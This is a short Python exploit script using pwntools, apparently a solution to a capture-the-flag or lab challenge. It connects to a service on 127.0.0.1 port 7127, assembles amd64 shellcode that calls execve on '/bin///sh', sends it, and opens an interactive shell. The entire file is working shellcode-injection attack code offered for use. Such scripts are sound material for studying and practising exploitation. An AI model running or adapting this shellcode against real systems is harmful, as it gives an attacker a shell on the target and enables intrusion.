#!/usr/bin/env python 
from pwn import *

context.arch = 'amd64'

r = remote('127.0.0.1', 7127)

a = asm("""
        push 0x68
        mov rax, 0x732f2f2f6e69622f
        push rax
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 59
        syscall
                """)
input("@")
r.send(a)

r.interactive()

